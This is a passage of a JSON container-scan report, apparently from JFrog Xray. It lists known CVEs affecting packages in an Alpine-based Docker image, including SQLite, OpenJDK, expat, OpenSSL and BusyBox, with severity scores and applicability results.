                            "vulnerability_id": "CVE-2019-19646",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-104993",
                    "summary": "In SQLite before 3.32.3, select.c mishandles query-flattener optimization, leading to a multiSelectOrderBy heap overflow because of misuse of transitive properties for constant propagation.",
                    "description": "In SQLite before 3.32.3, select.c mishandles query-flattener optimization, leading to a multiSelectOrderBy heap overflow because of misuse of transitive properties for constant propagation.",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2020-15358",
                            "cwe": [
                                "CWE-787"
                            ],
                            "cvss_v2": "2.1/CVSS:2.0/AV:L/AC:L/Au:N/C:N/I:N/A:P",
                            "cvss_v3": "5.5/CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"
                        }
                    ],
                    "created": "2020-07-06T00:00:00.109Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:sqlite-libs:3.28.0-r3"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2020-15358",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-127545",
                    "summary": "During ECDSA signature generation, padding applied in the nonce designed to ensure constant-time scalar multiplication was removed, resulting in variable-time execution dependent on secret data. This vulnerability affects Firefox < 80 and Firefox for Android < 80.",
                    "description": "During ECDSA signature generation, padding applied in the nonce designed to ensure constant-time scalar multiplication was removed, resulting in variable-time execution dependent on secret data. This vulnerability affects Firefox < 80 and Firefox for Android < 80.",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2020-12401",
                            "cwe": [
                                "CWE-203"
                            ],
                            "cvss_v2": "1.9/CVSS:2.0/AV:L/AC:M/Au:N/C:P/I:N/A:N",
                            "cvss_v3": "4.7/CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:N/A:N"
                        }
                    ],
                    "created": "2020-10-27T00:00:00.068Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:nss:3.44.3-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2020-12401",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-514967",
                    "summary": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: JSSE).  Supported versions that are affected are Oracle Java SE: 8u361, 8u361-perf, 11.0.18, 17.0.6, 20; Oracle GraalVM Enterprise Edition: 20.3.9, 21.3.5 and  22.3.1. Difficult to exploit vulnerability allows unauthenticated attacker with network access via HTTPS to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition.  Successful attacks of this vulnerability can result in unauthorized ability to cause a hang or frequently repeatable crash (complete DOS) of Oracle Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.9 (Availability impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H).",
                    "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: JSSE).  Supported versions that are affected are Oracle Java SE: 8u361, 8u361-perf, 11.0.18, 17.0.6, 20; Oracle GraalVM Enterprise Edition: 20.3.9, 21.3.5 and  22.3.1. Difficult to exploit vulnerability allows unauthenticated attacker with network access via HTTPS to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition.  Successful attacks of this vulnerability can result in unauthorized ability to cause a hang or frequently repeatable crash (complete DOS) of Oracle Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.9 (Availability impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H).",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2023-21967",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ],
                            "cvss_v3": "5.9/CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"
                        }
                    ],
                    "created": "2023-04-19T00:00:00.967Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2023-21967",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-533250",
                    "summary": "A vulnerability was found in libX11 due to a boundary condition within the _XkbReadKeySyms() function. This flaw allows a local user to trigger an out-of-bounds read error and read the contents of memory on the system.",
                    "description": "A vulnerability was found in libX11 due to a boundary condition within the _XkbReadKeySyms() function. This flaw allows a local user to trigger an out-of-bounds read error and read the contents of memory on the system.",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2023-43785",
                            "cwe": [
                                "CWE-125"
                            ],
                            "cvss_v3": "5.5/CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N"
                        }
                    ],
                    "created": "2023-10-10T00:00:00.080Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:libx11:1.6.12-r1"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2023-43785",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-193425",
                    "summary": "In Expat (aka libexpat) before 2.4.3, a left shift by 29 (or more) places in the storeAtts function in xmlparse.c can lead to realloc misbehavior (e.g., allocating too few bytes, or only freeing memory).",
                    "description": "In Expat (aka libexpat) before 2.4.3, a left shift by 29 (or more) places in the storeAtts function in xmlparse.c can lead to realloc misbehavior (e.g., allocating too few bytes, or only freeing memory).",
                    "issue_type": "security",
                    "severity": "High",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2021-45960",
                            "cwe": [
                                "CWE-682"
                            ],
                            "cvss_v2": "9.0/CVSS:2.0/AV:N/AC:L/Au:S/C:C/I:C/A:C",
                            "cvss_v3": "8.8/CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
                        }
                    ],
                    "created": "2022-01-02T00:00:00.130Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:expat:2.2.8-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2021-45960",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-259737",
                    "summary": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Security). Supported versions that are affected are Oracle Java SE: 8u341, 8u345-perf, 11.0.16.1; Oracle GraalVM Enterprise Edition: 20.3.7, 21.3.3 and 22.2.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTPS to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).",
                    "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Security). Supported versions that are affected are Oracle Java SE: 8u341, 8u345-perf, 11.0.16.1; Oracle GraalVM Enterprise Edition: 20.3.7, 21.3.3 and 22.2.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTPS to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2022-21626",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ],
                            "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
                        }
                    ],
                    "created": "2022-10-24T00:00:00.309Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2022-21626",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-523654",
                    "summary": "crypto/rsa/rsa_gen.c in OpenSSL before 0.9.6 mishandles C bitwise-shift operations that exceed the size of an expression, which makes it easier for remote attackers to defeat cryptographic protection mechanisms by leveraging improper RSA key generation on 64-bit HP-UX platforms.",
                    "description": "crypto/rsa/rsa_gen.c in OpenSSL before 0.9.6 mishandles C bitwise-shift operations that exceed the size of an expression, which makes it easier for remote attackers to defeat cryptographic protection mechanisms by leveraging improper RSA key generation on 64-bit HP-UX platforms.",
                    "issue_type": "security",
                    "severity": "High",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2000-1254",
                            "cwe": [
                                "CWE-310"
                            ],
                            "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:P/I:N/A:N",
                            "cvss_v3": "7.5/CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
                        }
                    ],
                    "created": "2023-07-17T00:00:00.236Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libssl1.1:1.1.1k-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libcrypto1.1:1.1.1k-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2000-1254",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-526070",
                    "summary": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition, Oracle GraalVM for JDK product of Oracle Java SE (component: Libraries).  Supported versions that are affected are Oracle Java SE: 8u371, 8u371-perf, 11.0.19, 17.0.7, 20.0.1; Oracle GraalVM Enterprise Edition: 20.3.10, 21.3.6, 22.3.2; Oracle GraalVM for JDK: 17.0.7 and  20.0.1. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition, Oracle GraalVM for JDK.  Successful attacks of this vulnerability can result in  unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM Enterprise Edition, Oracle GraalVM for JDK accessible data. Note: This vulnerability can be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. This vulnerability also applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. CVSS 3.1 Base Score 3.7 (Integrity impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N).",
                    "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition, Oracle GraalVM for JDK product of Oracle Java SE (component: Libraries).  Supported versions that are affected are Oracle Java SE: 8u371, 8u371-perf, 11.0.19, 17.0.7, 20.0.1; Oracle GraalVM Enterprise Edition: 20.3.10, 21.3.6, 22.3.2; Oracle GraalVM for JDK: 17.0.7 and  20.0.1. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition, Oracle GraalVM for JDK.  Successful attacks of this vulnerability can result in  unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM Enterprise Edition, Oracle GraalVM for JDK accessible data. Note: This vulnerability can be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. This vulnerability also applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. CVSS 3.1 Base Score 3.7 (Integrity impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N).",
                    "issue_type": "security",
                    "severity": "Low",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2023-22049",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ],
                            "cvss_v3": "3.7/CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N"
                        }
                    ],
                    "created": "2023-07-19T00:00:00.281Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2023-22049",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-529062",
                    "summary": "There is a stack overflow vulnerability in ash.c:6030 in busybox before 1.35. In the environment of Internet of Vehicles, this vulnerability can be executed from command to arbitrary code execution.",
                    "description": "There is a stack overflow vulnerability in ash.c:6030 in busybox before 1.35. In the environment of Internet of Vehicles, this vulnerability can be executed from command to arbitrary code execution.",
                    "issue_type": "security",
                    "severity": "Critical",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2022-48174",
                            "cwe": [
                                "CWE-787"
                            ],
                            "cvss_v3": "9.8/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
                        }
                    ],
                    "created": "2023-08-27T00:00:00.416Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:ssl_client:1.30.1-r5",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:busybox:1.30.1-r5"
                    ],
                    "extended_information": {
                        "short_description": "A stack buffer overflow in BusyBox ash leads to denial of service and possibly code execution when processing malformed command line arguments.",
                        "full_description": "[BusyBox](https://busybox.net/) is a lightweight and versatile software package that combines several common Unix utilities into a single executable file, providing a streamlined and efficient solution for resource-constrained environments or embedded systems.\n`ash` is a Unix shell interpreter included with `Busybox`, which can be used as an interactive shell or as a script interpreter, depending on the way it was run. It is often used in embedded systems and other environments with limited resources where a full-featured shell like Bash might be too resource-intensive.\n\nA stack buffer overflow in BusyBox ash leads to denial of service and possibly code execution when processing malformed command line arguments.\n\nAn attacker that controls an initial input to the shell via the `-c` command line argument can propagate malformed input to the vulnerable function `evaluate_string`. A public [exploit](https://bugs.busybox.net/show_bug.cgi?id=15216) which demonstrates denial of service exists, but no public exploit is known for the arbitrary code execution part.",
                        "jfrog_research_severity": "Low",
                        "jfrog_research_severity_reasons": [
                            {
                                "name": "The issue has an exploit published",
                                "description": "The linked vendor advisory from BusyBox shows a PoC demonstrating a crash.",
                                "is_positive": false
                            },
                            {
                                "name": "The reported CVSS was either wrongly calculated, downgraded by other vendors, or does not reflect the vulnerability's impact",
                                "description": "The given CVSS score does not reflect the context required to exploit this vulnerability.",
                                "is_positive": true
                            },
                            {
                                "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                                "description": "`BusyBox ash` is an interactive shell, in order to exploit this vulnerability an attacker needs to trigger the buffer overflow using functionalities supplied within the shell itself.\nMoreover, the buffer overflow is only applicable when the `-c` flag, which denotes a script, is used.",
                                "is_positive": true
                            },
                            {
                                "name": "The prerequisites for exploiting the issue are extremely unlikely",
                                "description": "The applet must accept arbitrary command line arguments from an external source.",
                                "is_positive": true
                            },
                            {
                                "name": "The issue cannot result in a severe impact (such as remote code execution)",
                                "description": "The `ash` interactive shell is usually used in a local context, which makes crashing the process a non-issue.\nMoreover, if an attacker was granted access to run scripts in `ash` the possibility of malicious arbitrary code execution is already high.",
                                "is_positive": true
                            }
                        ]
                    },
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:busybox:1.30.1-r5",
                            "cve_id": "CVE-2022-48174",
                            "scan_status": 1,
                            "applicability": null,
                            "evidence": null,
                            "info": "Applicability cannot be determined since exploitation depends on user interaction. Specifically - the attacker must be able to partially control the command line args of the 'busybox ash' command",
                            "details": null
                        },
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:ssl_client:1.30.1-r5",
                            "cve_id": "CVE-2022-48174",
                            "scan_status": 1,
                            "applicability": null,
                            "evidence": null,
                            "info": "Applicability cannot be determined since exploitation depends on user interaction. Specifically - the attacker must be able to partially control the command line args of the 'busybox ash' command",
                            "details": null
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:busybox:1.30.1-r5",
                            "vulnerability_id": "CVE-2022-48174",
                            "result": "undetermined"
                        },
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:ssl_client:1.30.1-r5",
                            "vulnerability_id": "CVE-2022-48174",
                            "result": "undetermined"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-648333",
                    "summary": "Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Networking).  Supported versions that are affected are Oracle Java SE: 8u421, 8u421-perf, 11.0.24, 17.0.12, 21.0.4, 23; Oracle GraalVM for JDK: 17.0.12, 21.0.4, 23; Oracle GraalVM Enterprise Edition: 20.3.15 and  21.3.11. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition.  Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.1 Base Score 3.7 (Availability impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L).",
                    "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Networking).  Supported versions that are affected are Oracle Java SE: 8u421, 8u421-perf, 11.0.24, 17.0.12, 21.0.4, 23; Oracle GraalVM for JDK: 17.0.12, 21.0.4, 23; Oracle GraalVM Enterprise Edition: 20.3.15 and  21.3.11. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition.  Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.1 Base Score 3.7 (Availability impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L).",
                    "issue_type": "security",
                    "severity": "Low",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2024-21208",
                            "cvss_v3": "3.7/CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L"
                        }
                    ],
                    "created": "2024-10-24T00:00:00.827Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2024-21208",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-693686",
                    "summary": "Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: JSSE).  Supported versions that are affected are Oracle Java SE:8u441, 8u441-perf, 11.0.26, 17.0.14, 21.0.6, 24; Oracle GraalVM for JDK:17.0.14, 21.0.6, 24; Oracle GraalVM Enterprise Edition:20.3.17 and  21.3.13. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition.  Successful attacks of this vulnerability can result in  unauthorized creation, deletion or modification access to critical data or all Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data as well as  unauthorized access to critical data or complete access to all Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability can be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. This vulnerability also applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. CVSS 3.1 Base Score 7.4 (Confidentiality and Integrity impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N).",
                    "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: JSSE).  Supported versions that are affected are Oracle Java SE:8u441, 8u441-perf, 11.0.26, 17.0.14, 21.0.6, 24; Oracle GraalVM for JDK:17.0.14, 21.0.6, 24; Oracle GraalVM Enterprise Edition:20.3.17 and  21.3.13. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition.  Successful attacks of this vulnerability can result in  unauthorized creation, deletion or modification access to critical data or all Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data as well as  unauthorized access to critical data or complete access to all Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability can be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. This vulnerability also applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. CVSS 3.1 Base Score 7.4 (Confidentiality and 